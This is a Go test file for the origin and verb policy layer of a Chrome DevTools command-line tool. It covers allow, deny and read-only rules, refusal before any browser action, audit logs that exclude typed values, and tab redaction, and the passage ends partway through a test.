package cli

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/spf13/cobra"

	"github.com/sanketsudake/chrome-cdp-cli/internal/chrome"
	"github.com/sanketsudake/chrome-cdp-cli/internal/config"
	"github.com/sanketsudake/chrome-cdp-cli/internal/policy"
	"github.com/sanketsudake/chrome-cdp-cli/internal/result"
	"github.com/sanketsudake/chrome-cdp-cli/internal/target"
)

// pendingVerbs are classification-table entries whose command has not landed in
// this branch yet, with the RFC that adds it. Everything else in the table must
// name a real command, or a typo would silently leave the real verb
// unclassified — which fails closed, but over-blocks in a way nobody would
// debug quickly.
var pendingVerbs = map[string]string{}

// TestEveryCommandIsClassified is RFC-0012 VS-5, and the reason this feature
// stays correct as verbs are added.
//
// read_only is only as good as the mutating/reading table, and a table
// maintained by good intentions rots the first time someone adds a verb in a
// hurry. This walks the registered cobra tree and fails on anything missing, so
// the omission is a red test in the same PR rather than a hole discovered
// later. It is the sibling of TestDispatchCoversBrowser in internal/daemon.
func TestEveryCommandIsClassified(t *testing.T) {
	t.Parallel()
	app := New(&fakeBrowser{}, &bytes.Buffer{}, &bytes.Buffer{})
	root := app.newRoot()

	registered := map[string]bool{}
	for _, path := range runnableCommands(root) {
		registered[path] = true
		if _, known := policy.Classify(path); !known {
			t.Errorf("command %q is not in the policy classification table.\n"+
				"Add it to verbClass in internal/policy/policy.go as Mutating, Reading, or Exempt. "+
				"An unclassified verb is treated as mutating, which over-restricts read_only origins.", path)
		}
	}
	for verb := range policy.Verbs() {
		if registered[verb] {
			continue
		}
		if rfc, ok := pendingVerbs[verb]; ok {
			t.Logf("classified verb %q has no command yet: %s", verb, rfc)
			continue
		}
		t.Errorf("the policy table classifies %q, which is not a registered command — "+
			"a typo here leaves the real verb unclassified", verb)
	}
}

// runnableCommands returns every leaf command's path minus the root name.
func runnableCommands(root *cobra.Command) []string {
	var out []string
	var walk func(c *cobra.Command)
	walk = func(c *cobra.Command) {
		if c != root && c.Runnable() {
			out = append(out, strings.TrimPrefix(c.CommandPath(), root.Name()+" "))
		}
		for _, sub := range c.Commands() {
			walk(sub)
		}
	}
	walk(root)
	return out
}

// refusalBrowser serves a tab list and fails the test if the CLI acts on it.
//
// Asserting the exit code alone would pass for a command that refused AND acted
// anyway, which is the failure mode that actually matters here: "refused with
// the right code but clicked the button" is indistinguishable from a working
// policy in every test that only reads the envelope. Only a recording stub sees
// it. List is permitted because the origin cannot be known without it — that is
// where the boundary sits, after target resolution and before any action.
type refusalBrowser struct {
	stubBrowser
	t    *testing.T
	tabs []target.Info
}

func (b *refusalBrowser) List(context.Context) ([]target.Info, error) { return b.tabs, nil }

func (b *refusalBrowser) acted(method string) {
	b.t.Helper()
	b.t.Fatalf("policy refused the command but %s was called anyway — the browser must never be reached on a refusal", method)
}

// Click is a Pointer action now, so refusing a click has to be caught here —
// overriding a Click method the interface no longer has would silently stop
// testing anything.
func (b *refusalBrowser) Pointer(_ context.Context, _, _ string, opts chrome.PointerOpts) (map[string]any, error) {
	b.acted("Pointer(" + string(opts.Action) + ")")
	return nil, nil
}

func (b *refusalBrowser) Type(context.Context, string, string, string, chrome.QueryOpts) (map[string]any, error) {
	b.acted("Type")
	return nil, nil
}

func (b *refusalBrowser) Fill(context.Context, string, string, string, chrome.QueryOpts) (map[string]any, error) {
	b.acted("Fill")
	return nil, nil
}

func (b *refusalBrowser) Eval(context.Context, string, string, chrome.EvalOpts) (any, error) {
	b.acted("Eval")
	return nil, nil
}

func (b *refusalBrowser) Navigate(context.Context, string, string) (map[string]any, error) {
	b.acted("Navigate")
	return nil, nil
}

func (b *refusalBrowser) Open(context.Context, string) (map[string]any, error) {
	b.acted("Open")
	return nil, nil
}

func (b *refusalBrowser) CookieSet(context.Context, string, string, string, string, string) (map[string]any, error) {
	b.acted("CookieSet")
	return nil, nil
}

func (b *refusalBrowser) Screenshot(context.Context, string, chrome.ShotOpts) ([]byte, map[string]any, error) {
	b.acted("Screenshot")
	return nil, nil, nil
}

func (b *refusalBrowser) Raw(context.Context, string, string, json.RawMessage) (any, error) {
	b.acted("Raw")
	return nil, nil
}

var _ chrome.Browser = (*refusalBrowser)(nil)

func refusing(t *testing.T, tabs ...target.Info) *refusalBrowser {
	t.Helper()
	return &refusalBrowser{t: t, tabs: tabs}
}

// runPolicy runs the CLI with a [policy] table in effect.
func runPolicy(t *testing.T, b chrome.Browser, pol config.Policy, args ...string) (env map[string]any, stderr string, code int) {
	t.Helper()
	app, out, errb := appWithPolicy(b, pol)
	code = app.Execute(args...)
	if s := strings.TrimSpace(out.String()); strings.HasPrefix(s, "{") {
		if err := json.Unmarshal([]byte(s), &env); err != nil {
			t.Fatalf("stdout is not one JSON value: %v\n%s", err, s)
		}
	}
	return env, errb.String(), code
}

func appWithPolicy(b chrome.Browser, pol config.Policy) (*App, *bytes.Buffer, *bytes.Buffer) {
	out, errb := &bytes.Buffer{}, &bytes.Buffer{}
	d := config.Builtin()
	d.Policy = pol
	return New(b, out, errb).WithDefaults(d), out, errb
}

// allowOnly is the common case: a policy that permits exactly these patterns.
func allowOnly(patterns ...string) config.Policy {
	return config.Policy{Present: true, Enabled: true, Allow: patterns, Source: "/test/config.toml"}
}

func errObj(t *testing.T, env map[string]any) map[string]any {
	t.Helper()
	e, ok := env["error"].(map[string]any)
	if !ok {
		t.Fatalf("envelope has no error object: %v", env)
	}
	return e
}

// TestAllowListRefusesWithoutActing is VS-1: the allowed origin works, the
// other one exits 7 and the browser is never asked to do anything.
func TestAllowListRefusesWithoutActing(t *testing.T) {
	t.Parallel()
	tabs := []target.Info{
		{ID: "aa11", Title: "App", URL: "https://app.example.com/dash"},
		{ID: "bb22", Title: "Other", URL: "https://other.test/x"},
	}
	t.Run("permitted origin acts", func(t *testing.T) {
		t.Parallel()
		b := &fakeBrowser{tabs: tabs}
		env, _, code := runPolicy(t, b, allowOnly("*.example.com"), "click", "#go", "--target", "aa11", "--json")
		if code != 0 {
			t.Fatalf("exit = %d, want 0: %v", code, env)
		}
	})
	t.Run("other origin is refused and nothing is clicked", func(t *testing.T) {
		t.Parallel()
		b := refusing(t, tabs...)
		env, stderr, code := runPolicy(t, b, allowOnly("*.example.com"), "click", "#go", "--target", "bb22", "--json")
		if code != result.ExitPermission {
			t.Fatalf("exit = %d, want %d (permission)", code, result.ExitPermission)
		}
		e := errObj(t, env)
		if e["code"] != result.CodePermissionDenied {
			t.Errorf("error.code = %v, want %q", e["code"], result.CodePermissionDenied)
		}
		if e["origin"] != "other.test" || e["verb"] != "click" || e["rule"] != "allow: no match" {
			t.Errorf("refusal must name the origin, verb and rule: %v", e)
		}
		if e["config"] != "/test/config.toml" {
			t.Errorf("refusal must name the config file to edit, got %v", e["config"])
		}
		if !strings.Contains(stderr, "other.test") {
			t.Errorf("a refusal should be visible on stderr, got %q", stderr)
		}
	})
}

// TestDenyBeatsAllowAtTheBoundary is VS-2 end to end.
func TestDenyBeatsAllowAtTheBoundary(t *testing.T) {
	t.Parallel()
	pol := allowOnly("*.example.com")
	pol.Deny = []string{"admin.example.com"}
	b := refusing(t, target.Info{ID: "cc33", Title: "Admin", URL: "https://admin.example.com/users"})
	env, _, code := runPolicy(t, b, pol, "type", "#q", "hunter2", "--target", "cc33", "--json")
	if code != result.ExitPermission {
		t.Fatalf("exit = %d, want %d", code, result.ExitPermission)
	}
	if got := errObj(t, env)["rule"]; got != "deny: admin.example.com" {
		t.Errorf("rule = %v, want the deny entry that decided it", got)
	}
}

// TestReadOnlyOriginAtTheBoundary is VS-4 end to end: reads pass, actions are
// refused with exit 7 and no browser call.
func TestReadOnlyOriginAtTheBoundary(t *testing.T) {
	t.Parallel()
	pol := config.Policy{Present: true, Enabled: true, ReadOnly: []string{"*.wiki.test"}}
	tab := target.Info{ID: "dd44", Title: "Wiki", URL: "https://en.wiki.test/Go"}

	for _, args := range [][]string{
		{"text", "h1"}, {"snap"}, {"grid"}, {"html"},
	} {
		t.Run("reading/"+args[0], func(t *testing.T) {
			t.Parallel()
			full := append(append([]string{}, args...), "--target", "dd44", "--json")
			_, _, code := runPolicy(t, &fakeBrowser{tabs: []target.Info{tab}}, pol, full...)
			if code != 0 {
				t.Errorf("%v exit = %d, want 0 on a read-only origin", args, code)
			}
		})
	}
	for _, args := range [][]string{
		{"click", "#x"}, {"fill", "#x", "v"}, {"type", "#x", "v"},
		{"eval", "1+1"}, {"cookie", "set", "sid", "abc"},
	} {
		t.Run("mutating/"+strings.Join(args[:2], " "), func(t *testing.T) {
			t.Parallel()
			full := append(append([]string{}, args...), "--target", "dd44", "--json")
			env, _, code := runPolicy(t, refusing(t, tab), pol, full...)
			if code != result.ExitPermission {
				t.Fatalf("%v exit = %d, want %d", args, code, result.ExitPermission)
			}
			if got := errObj(t, env)["rule"]; got != "read_only: *.wiki.test" {
				t.Errorf("rule = %v", got)
			}
		})
	}
}

// TestVerbsDeniedAtTheBoundary is VS-7: `raw` is refused even where the origin
// is allowed.
func TestVerbsDeniedAtTheBoundary(t *testing.T) {
	t.Parallel()
	pol := allowOnly("*.example.com")
	pol.VerbsDenied = []string{"raw"}
	tab := target.Info{ID: "aa11", Title: "App", URL: "https://app.example.com/"}
	env, _, code := runPolicy(t, refusing(t, tab), pol, "raw", "Runtime.evaluate", "--target", "aa11", "--json")
	if code != result.ExitPermission {
		t.Fatalf("exit = %d, want %d", code, result.ExitPermission)
	}
	if got := errObj(t, env)["rule"]; got != "verbs_denied: raw" {
		t.Errorf("rule = %v", got)
	}
}

// TestBrowserLevelRawIsChecked closes the one path that resolves no tab.
//
// `raw --browser` and `raw --list` talk to the browser rather than to a page,
// so they never reach the enforcement point in resolveTarget. Left unchecked
// they would be the way around the whole layer: Target.createTarget can open a
// tab anywhere, and verbs_denied = ["raw"] would mean everything except raw's
// most powerful form.
func TestBrowserLevelRawIsChecked(t *testing.T) {
	t.Parallel()
	for _, args := range [][]string{
		{"raw", "--list"},
		{"raw", "Target.createTarget", `{"url":"https://other.test"}`, "--browser"},
	} {
		t.Run(strings.Join(args[1:2], " "), func(t *testing.T) {
			t.Parallel()
			full := append(append([]string{}, args...), "--json")
			env, _, code := runPolicy(t, noCall(t), allowOnly("*.example.com"), full...)
			if code != result.ExitPermission {
				t.Fatalf("%v exit = %d, want %d", args, code, result.ExitPermission)
			}
			if got := errObj(t, env)["verb"]; got != "raw" {
				t.Errorf("verb = %v", got)
			}
		})
	}
	// verbs_denied covers it too, even with no allow-list at all.
	pol := config.Policy{Present: true, Enabled: true, VerbsDenied: []string{"raw"}}
	_, _, code := runPolicy(t, noCall(t), pol, "raw", "--list", "--json")
	if code != result.ExitPermission {
		t.Errorf("exit = %d, want %d for a denied verb at the browser level", code, result.ExitPermission)
	}
	// Unconfigured, it still works exactly as before.
	if _, _, code := runPolicy(t, &fakeBrowser{}, config.Policy{}, "raw", "--list", "--json"); code != 0 {
		t.Errorf("exit = %d, want 0 with no policy configured", code)
	}
}

// TestNavChecksDestinationBeforeConnecting is VS-8. noCall proves the tab is
// untouched: the refusal happens before Chrome is contacted at all, so the
// navigation cannot have started.
func TestNavChecksDestinationBeforeConnecting(t *testing.T) {
	t.Parallel()
	env, _, code := runPolicy(t, noCall(t), allowOnly("*.example.com"), "nav", "https://other.test/", "--target", "aa11", "--json")
	if code != result.ExitPermission {
		t.Fatalf("exit = %d, want %d", code, result.ExitPermission)
	}
	e := errObj(t, env)
	if e["origin"] != "other.test" || e["verb"] != "nav" {
		t.Errorf("refusal should name the destination: %v", e)
	}
}

// TestOpenChecksDestinationBeforeConnecting: `open` resolves no target, so the
// destination check is its only boundary — and it must also come first.
func TestOpenChecksDestinationBeforeConnecting(t *testing.T) {
	t.Parallel()
	_, _, code := runPolicy(t, noCall(t), allowOnly("*.example.com"), "open", "https://other.test/", "--json")
	if code != result.ExitPermission {
		t.Fatalf("exit = %d, want %d", code, result.ExitPermission)
	}
	// The allowed destination still works.
	b := &fakeBrowser{}
	_, _, code = runPolicy(t, b, allowOnly("*.example.com"), "open", "https://app.example.com/", "--json")
	if code != 0 {
		t.Errorf("exit = %d, want 0 for an allowed destination", code)
	}
}

// TestRedirectIsCaughtOnTheNextCommand is VS-9's stub-testable half.
//
// A redirect away from an allowed origin cannot be prevented — the RFC is
// honest that this is a guardrail, not a sandbox — so what must hold is that
// the NEXT command sees the settled URL and refuses. resolveTarget reads the
// tab list fresh every invocation, so the tab having moved is all it takes.
func TestRedirectIsCaughtOnTheNextCommand(t *testing.T) {
	t.Parallel()
	settled := target.Info{ID: "aa11", Title: "Elsewhere", URL: "https://evil.test/landed"}
	env, _, code := runPolicy(t, refusing(t, settled), allowOnly("*.example.com"), "click", "#go", "--target", "aa11", "--json")
	if code != result.ExitPermission {
		t.Fatalf("exit = %d, want %d", code, result.ExitPermission)
	}
	if got := errObj(t, env)["origin"]; got != "evil.test" {
		t.Errorf("the refusal must name the SETTLED origin, got %v", got)
	}
}

// TestUnconfiguredPolicyChangesNothing is VS-10 / US-5.
//
// The rest of the suite is the real evidence — every existing test runs with
// this code compiled in and unconfigured — but this pins the intent directly,
// including that the empty [policy] fast path is what runs.
func TestUnconfiguredPolicyChangesNothing(t *testing.T) {
	t.Parallel()
	tabs := []target.Info{{ID: "aa11", Title: "X", URL: "https://anywhere.test/"}}
	for _, args := range [][]string{
		{"click", "#x"}, {"eval", "1+1"}, {"raw", "Foo.bar"},
		{"cookie", "set", "a", "b"}, {"text", "h1"}, {"nav", "https://elsewhere.test/"},
	} {
		t.Run(strings.Join(args[:1], " "), func(t *testing.T) {
			t.Parallel()
			full := append(append([]string{}, args...), "--target", "aa11", "--json")
			env, stderr, code := runPolicy(t, &fakeBrowser{tabs: tabs}, config.Policy{}, full...)
			if code != 0 {
				t.Fatalf("%v exit = %d, want 0 with no policy configured: %v", args, code, env)
			}
			if strings.Contains(stderr, "policy") {
				t.Errorf("an unconfigured policy must be silent, got %q", stderr)
			}
		})
	}
}

// TestAllowFlagOverridesConfig is the flag precedence from the RFC's test plan:
// --allow replaces the configured list, and --policy-off overrides both.
func TestAllowFlagOverridesConfig(t *testing.T) {
	t.Parallel()
	tab := target.Info{ID: "aa11", Title: "App", URL: "https://app.example.com/"}
	pol := allowOnly("*.nowhere.test")

	t.Run("--allow replaces the configured list", func(t *testing.T) {
		t.Parallel()
		_, _, code := runPolicy(t, &fakeBrowser{tabs: []target.Info{tab}}, pol,
			"click", "#x", "--allow", "*.example.com", "--target", "aa11", "--json")
		if code != 0 {
			t.Fatalf("exit = %d, want 0 — --allow should override the config list", code)
		}
	})
	t.Run("--allow works with no config at all", func(t *testing.T) {
		t.Parallel()
		_, _, code := runPolicy(t, refusing(t, tab), config.Policy{},
			"click", "#x", "--allow", "*.nope.test", "--target", "aa11", "--json")
		if code != result.ExitPermission {
			t.Errorf("exit = %d, want %d — --allow alone should bound the CLI", code, result.ExitPermission)
		}
	})
	t.Run("--allow does not unblock a denied origin", func(t *testing.T) {
		t.Parallel()
		denied := pol
		denied.Deny = []string{"app.example.com"}
		_, _, code := runPolicy(t, refusing(t, tab), denied,
			"click", "#x", "--allow", "*.example.com", "--target", "aa11", "--json")
		if code != result.ExitPermission {
			t.Errorf("exit = %d, want %d — --allow narrows, it never unblocks", code, result.ExitPermission)
		}
	})
}

// TestPolicyOffIsExplicitAndLogged is VS-12.
func TestPolicyOffIsExplicitAndLogged(t *testing.T) {
	t.Parallel()
	logPath := filepath.Join(t.TempDir(), "audit.log")
	pol := allowOnly("*.nowhere.test")
	pol.AuditLog = logPath
	tab := target.Info{ID: "aa11", Title: "App", URL: "https://app.example.com/"}

	_, stderr, code := runPolicy(t, &fakeBrowser{tabs: []target.Info{tab}}, pol,
		"click", "#x", "--policy-off", "--target", "aa11", "--json")
	if code != 0 {
		t.Fatalf("exit = %d, want 0 — --policy-off must bypass the policy", code)
	}
	if !strings.Contains(stderr, "--policy-off") {
		t.Errorf("the bypass must warn on stderr, got %q", stderr)
	}
	recs := readAudit(t, logPath)
	if len(recs) != 1 || recs[0]["decision"] != "bypassed" {
		t.Fatalf("the bypass must be audited, got %v", recs)
	}
	if recs[0]["origin"] != "app.example.com" || recs[0]["verb"] != "click" {
		t.Errorf("audit record = %v", recs[0])
	}
}

// TestPromptNeverBlocksWithoutATTY is VS-13.
//
// on_violation = "prompt" is only meaningful when there is somebody to ask. In
// a piped, daemonised, or MCP run there is not, and a policy layer that hangs
// forever waiting for an answer is a worse outage than the refusal it was
// trying to soften. The seam here would block if it were ever reached, and the
// bounded wait proves it is not.
func TestPromptNeverBlocksWithoutATTY(t *testing.T) {
	t.Parallel()
	pol := allowOnly("*.nowhere.test")
	pol.OnViolation = policy.OnPrompt
	tab := target.Info{ID: "aa11", Title: "App", URL: "https://app.example.com/"}

	app, _, _ := appWithPolicy(refusing(t, tab), pol)
	app.policyAsk = func(string) bool {
		t.Error("the policy prompted with no TTY; it must refuse instead")
		select {} // a real prompt would block here forever
	}

	done := make(chan int, 1)
	go func() { done <- app.Execute("click", "#x", "--target", "aa11", "--json") }()
	select {
	case code := <-done:
		if code != result.ExitPermission {
			t.Errorf("exit = %d, want %d", code, result.ExitPermission)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("the command did not return: on_violation = prompt blocked a non-interactive run")
	}
}

// TestPromptOnATTYAsksAndObeys covers the other half: where there IS somebody
// to ask, the answer decides, and a yes is audited as such.
func TestPromptOnATTYAsksAndObeys(t *testing.T) {
	t.Parallel()
	tab := target.Info{ID: "aa11", Title: "App", URL: "https://app.example.com/"}

	t.Run("no refuses", func(t *testing.T) {
		t.Parallel()
		pol := allowOnly("*.nowhere.test")
		pol.OnViolation = policy.OnPrompt
		app, _, _ := appWithPolicy(refusing(t, tab), pol)
		asked := false
		app.policyTTY = func() bool { return true }
		app.policyAsk = func(q string) bool {
			asked = true
			if !strings.Contains(q, "app.example.com") {
				t.Errorf("the question must name the origin, got %q", q)
			}
			return false
		}
		if code := app.Execute("click", "#x", "--target", "aa11", "--json"); code != result.ExitPermission {
			t.Errorf("exit = %d, want %d", code, result.ExitPermission)
		}
		if !asked {
			t.Error("on_violation = prompt must ask when there is a TTY")
		}
	})

	t.Run("yes proceeds and is audited", func(t *testing.T) {
		t.Parallel()
		logPath := filepath.Join(t.TempDir(), "audit.log")
		pol := allowOnly("*.nowhere.test")
		pol.OnViolation = policy.OnPrompt
		pol.AuditLog = logPath
		app, _, _ := appWithPolicy(&fakeBrowser{tabs: []target.Info{tab}}, pol)
		app.policyTTY = func() bool { return true }
		app.policyAsk = func(string) bool { return true }
		if code := app.Execute("click", "#x", "--target", "aa11", "--json"); code != 0 {
			t.Errorf("exit = %d, want 0 after an approved prompt", code)
		}
		recs := readAudit(t, logPath)
		if len(recs) != 1 || recs[0]["decision"] != "allowed_by_prompt" {
			t.Errorf("an approved violation must be audited, got %v", recs)
		}
	})
}

// TestAuditLogRecordsDecisionsAndNeverValues is VS-14.
//
// The negative assertion is the point. An audit log that recorded what was
// typed would be the single most sensitive file this tool produces — every
// password and one-time code that ever went through `type`, in plain text, in a
// file nobody thinks of as a secret. So the check is on the file's bytes, not
// on the record struct, because the struct is what would change.
func TestAuditLogRecordsDecisionsAndNeverValues(t *testing.T) {
	t.Parallel()
	const secret = "correct-horse-battery-staple"
	logPath := filepath.Join(t.TempDir(), "audit.log")
	pol := allowOnly("*.example.com")
	pol.AuditLog = logPath
	pol.AuditAll = true
	tabs := []target.Info{
		{ID: "aa11", Title: "App", URL: "https://app.example.com/login?token=" + secret},
		{ID: "bb22", Title: "Other", URL: "https://other.test/"},
	}

	// An allowed action carrying sensitive text...
	if _, _, code := runPolicyOn(t, &fakeBrowser{tabs: tabs}, pol, "type", "#pw", secret, "--target", "aa11", "--json"); code != 0 {
		t.Fatalf("allowed type exit = %d", code)
	}
	// ...and a refusal, so the log has both kinds of record.
	if _, _, code := runPolicyOn(t, refusing(t, tabs...), pol, "click", "#x", "--target", "bb22", "--json"); code != result.ExitPermission {
		t.Fatalf("refused click exit = %d", code)
	}

	raw, err := os.ReadFile(logPath)
	if err != nil {
		t.Fatalf("audit log: %v", err)
	}
	if strings.Contains(string(raw), secret) {
		t.Fatalf("the audit log contains a typed value.\n"+
			"It must record only timestamp/origin/verb/decision/rule — never values, and never a full URL, whose query string carries them too.\n%s", raw)
	}
	if strings.Contains(string(raw), "#pw") {
		t.Errorf("the audit log contains a selector; it should carry no command arguments at all:\n%s", raw)
	}

	recs := readAudit(t, logPath)
	if len(recs) != 2 {
		t.Fatalf("want 2 records (audit_all logs the allowed action too), got %d: %v", len(recs), recs)
	}
	if recs[0]["decision"] != "allowed" || recs[0]["verb"] != "type" || recs[0]["origin"] != "app.example.com" {
		t.Errorf("allowed record = %v", recs[0])
	}
	if recs[1]["decision"] != "refused" || recs[1]["rule"] != "allow: no match" || recs[1]["origin"] != "other.test" {
		t.Errorf("refusal record = %v", recs[1])
	}
	for _, r := range recs {
		if r["ts"] == "" || r["ts"] == nil {
			t.Errorf("record has no timestamp: %v", r)
		}
		for k := range r {
			switch k {
			case "ts", "origin", "verb", "decision", "rule":
			default:
				t.Errorf("unexpected audit field %q — the field set is the hygiene guarantee", k)
			}
		}
	}
}

// TestAuditLogsRefusalsWithoutAuditAll keeps the default useful: refusals are
// always recorded, permitted actions only with audit_all.
func TestAuditLogsRefusalsWithoutAuditAll(t *testing.T) {
	t.Parallel()
	logPath := filepath.Join(t.TempDir(), "audit.log")
	pol := allowOnly("*.example.com")
	pol.AuditLog = logPath
	tabs := []target.Info{
		{ID: "aa11", Title: "App", URL: "https://app.example.com/"},
		{ID: "bb22", Title: "Other", URL: "https://other.test/"},
	}
	if _, _, code := runPolicyOn(t, &fakeBrowser{tabs: tabs}, pol, "click", "#x", "--target", "aa11", "--json"); code != 0 {
		t.Fatalf("allowed click exit = %d", code)
	}
	if _, _, code := runPolicyOn(t, refusing(t, tabs...), pol, "click", "#x", "--target", "bb22", "--json"); code != result.ExitPermission {
		t.Fatalf("refused click exit = %d", code)
	}
	recs := readAudit(t, logPath)
	if len(recs) != 1 || recs[0]["decision"] != "refused" {
		t.Errorf("without audit_all only refusals are logged, got %v", recs)
	}
}

// runPolicyOn is runPolicy for tests that make several calls against one log.
func runPolicyOn(t *testing.T, b chrome.Browser, pol config.Policy, args ...string) (map[string]any, string, int) {
	t.Helper()
	return runPolicy(t, b, pol, args...)
}

func readAudit(t *testing.T, path string) []map[string]any {
	t.Helper()
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("audit log %s: %v", path, err)
	}
	var out []map[string]any
	for _, line := range strings.Split(strings.TrimSpace(string(raw)), "\n") {
		if line == "" {
			continue
		}
		var m map[string]any
		if err := json.Unmarshal([]byte(line), &m); err != nil {
			t.Fatalf("audit log is not NDJSON: %v\n%s", err, line)
		}
		out = append(out, m)
	}
	return out
}

// TestMalformedPolicyRefusesToRun is VS-15 at the command boundary.
//
// Everywhere else in this repo a bad config is a warning and the CLI carries on
// with the built-ins. Doing that here would leave the user bounded in their head
// and unbounded in fact, so the command refuses — and the browser is never
// contacted, because a policy we cannot read cannot have permitted anything.
func TestMalformedPolicyRefusesToRun(t *testing.T) {
	t.Parallel()
	t.Run("unparseable pattern", func(t *testing.T) {
		t.Parallel()
		pol := allowOnly("a.*.com")
		env, _, code := runPolicy(t, noCall(t), pol, "click", "#x", "--target", "aa11", "--json")
		if code != result.ExitUsage {
			t.Fatalf("exit = %d, want %d (usage — fix the config, do not retry)", code, result.ExitUsage)
		}
		e := errObj(t, env)
		if !strings.Contains(e["message"].(string), "a.*.com") {
			t.Errorf("the error must name the offending pattern: %v", e["message"])
		}
		if e["config"] != "/test/config.toml" {
			t.Errorf("the error must name the config file: %v", e)
		}
	})
	t.Run("table this build cannot read", func(t *testing.T) {
		t.Parallel()
		pol := config.Policy{Present: true, Enabled: true, Source: "/test/config.toml",
			Malformed: "unknown key(s) in the [policy] table: allowed"}
		_, _, code := runPolicy(t, noCall(t), pol, "click", "#x", "--target", "aa11", "--json")
		if code != result.ExitUsage {
			t.Fatalf("exit = %d, want %d", code, result.ExitUsage)
		}
	})
	t.Run("--policy-off still escapes a broken policy", func(t *testing.T) {
		t.Parallel()
		// A bad policy that cannot be bypassed would be worse than none: the
		// user would have no way to run the tool while they fix the file.
		tab := target.Info{ID: "aa11", Title: "App", URL: "https://app.example.com/"}
		_, _, code := runPolicy(t, &fakeBrowser{tabs: []target.Info{tab}}, allowOnly("a.*.com"),
			"click", "#x", "--policy-off", "--target", "aa11", "--json")
		if code != 0 {
			t.Errorf("exit = %d, want 0 — --policy-off must escape an unparseable policy", code)
		}
	})
	t.Run("exempt commands still run", func(t *testing.T) {
		t.Parallel()
		// `version` and friends never touch a tab, and refusing them would trap
		// the user inside a broken config with no way to read the docs.
		_, _, code := runPolicy(t, noCall(t), allowOnly("a.*.com"), "version")
		if code != 0 {
			t.Errorf("exit = %d, want 0 for a command that touches no tab", code)
		}
	})
}

// TestListRedactsNonAllowedTabs is VS-17.
func TestListRedactsNonAllowedTabs(t *testing.T) {
	t.Parallel()
	tabs := []target.Info{
		{ID: "aa11", Title: "App", URL: "https://app.example.com/dash?q=secret"},
		{ID: "bb22", Title: "Personal Mail", URL: "https://mail.other.test/inbox/1234?token=shh"},
	}
	env, _, code := runPolicy(t, &fakeBrowser{tabs: tabs}, allowOnly("*.example.com"), "list", "--json")
	if code != 0 {
		t.Fatalf("exit = %d, want 0 — list itself is never refused", code)
	}
	rows := env["result"].(map[string]any)["tabs"].([]any)
	if len(rows) != 2 {
		t.Fatalf("both tabs must still be listed, got %d", len(rows))
	}
	allowed := rows[0].(map[string]any)
	if allowed["url"] != tabs[0].URL || allowed["title"] != "App" {
		t.Errorf("an allowed tab must not be redacted: %v", allowed)
	}
	other := rows[1].(map[string]any)
	if other["url"] != "https://mail.other.test" {
		t.Errorf("a non-allowed tab must show only its origin, got %v", other["url"])
	}
	if other["title"] != "" {
		t.Errorf("a non-allowed tab's title must be redacted, got %v", other["title"])
	}
	if other["id"] != "bb22" {
		t.Errorf("the tab must stay addressable by id: %v", other)
	}
	// Unconfigured, nothing is redacted.
	env, _, _ = runPolicy(t, &fakeBrowser{tabs: tabs}, config.Policy{}, "list", "--json")
	rows = env["result"].(map[string]any)["tabs"].([]any)
	if rows[1].(map[string]any)["url"] != tabs[1].URL {
		t.Error("with no policy configured, list must be unchanged")
	}
}

// TestExemptVerbsRunUnderARefusingPolicy keeps the tab verbs usable: you have
// to be able to see and switch tabs to get back to an allowed origin.
func TestExemptVerbsRunUnderARefusingPolicy(t *testing.T) {
	t.Parallel()
	tab := target.Info{ID: "aa11", Title: "Other", URL: "https://other.test/"}
	for _, args := range [][]string{{"list"}, {"activate", "aa11"}, {"close", "aa11"}, {"version"}, {"exit-codes"}} {
		t.Run(args[0], func(t *testing.T) {
			t.Parallel()
			full := append(append([]string{}, args...), "--json")
			_, _, code := runPolicy(t, &fakeBrowser{tabs: []target.Info{tab}}, allowOnly("*.example.com"), full...)
			if code != 0 {
				t.Errorf("%v exit = %d, want 0 — tab and meta verbs are not origin-checked", args, code)
			}
		})
	}
}

// TestPolicyInitWritesAStarterTable covers RFC-0012 open question 4.
func TestPolicyInitWritesAStarterTable(t *testing.T) {
	t.Parallel()
	tab := target.Info{ID: "aa11", Title: "App", URL: "https://app.example.com/dash"}

	t.Run("writes the current tab's origin", func(t *testing.T) {
		t.Parallel()
		cfg := filepath.Join(t.TempDir(), "config.toml")
		_, _, code := runPolicy(t, &fakeBrowser{tabs: []target.Info{tab}}, config.Policy{},
			"policy", "init", "-o", cfg, "--target", "aa11", "--json")
		if code != 0 {
			t.Fatalf("exit = %d, want 0", code)
		}
		body, err := os.ReadFile(cfg)
		if err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(string(body), `allow = ["app.example.com"]`) {
			t.Errorf("written config:\n%s", body)
		}
		// And what it writes must be a policy this build accepts.
		d, err := config.ResolveFrom(cfg, func(string) string { return "" })
		if err != nil {
			t.Fatalf("the generated config must parse: %v", err)
		}
		if !d.Policy.Present || !d.Policy.Enabled || d.Policy.Malformed != "" {
			t.Fatalf("generated policy = %+v", d.Policy)
		}
		if _, err := policy.New(policy.Config{Present: true, Enabled: true, Allow: d.Policy.Allow}); err != nil {
			t.Errorf("the generated policy must be valid: %v", err)
		}
	})

	t.Run("--wildcard allow-lists subdomains", func(t *testing.T) {
		t.Parallel()
		cfg := filepath.Join(t.TempDir(), "config.toml")
		runPolicy(t, &fakeBrowser{tabs: []target.Info{tab}}, config.Policy{},
			"policy", "init", "-o", cfg, "--wildcard", "--target", "aa11", "--json")
		body, _ := os.ReadFile(cfg)
		if !strings.Contains(string(body), `allow = ["*.app.example.com"]`) {
			t.Errorf("written config:\n%s", body)
		}
	})

	t.Run("refuses to overwrite an existing policy", func(t *testing.T) {
		t.Parallel()
		cfg := filepath.Join(t.TempDir(), "config.toml")
		if err := os.WriteFile(cfg, []byte("[policy]\nallow = [\"mine.test\"]\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		_, _, code := runPolicy(t, &fakeBrowser{tabs: []target.Info{tab}}, config.Policy{},
			"policy", "init", "-o", cfg, "--target", "aa11", "--json")
		if code == 0 {
			t.Error("policy init must not silently rewrite an existing policy")
		}
		body, _ := os.ReadFile(cfg)
		if !strings.Contains(string(body), "mine.test") || strings.Contains(string(body), "app.example.com") {
			t.Errorf("the existing policy must be left alone:\n%s", body)
		}
	})

	t.Run("--print writes nothing", func(t *testing.T) {
		t.Parallel()
		cfg := filepath.Join(t.TempDir(), "config.toml")
		app, out, _ := appWithPolicy(&fakeBrowser{tabs: []target.Info{tab}}, config.Policy{})
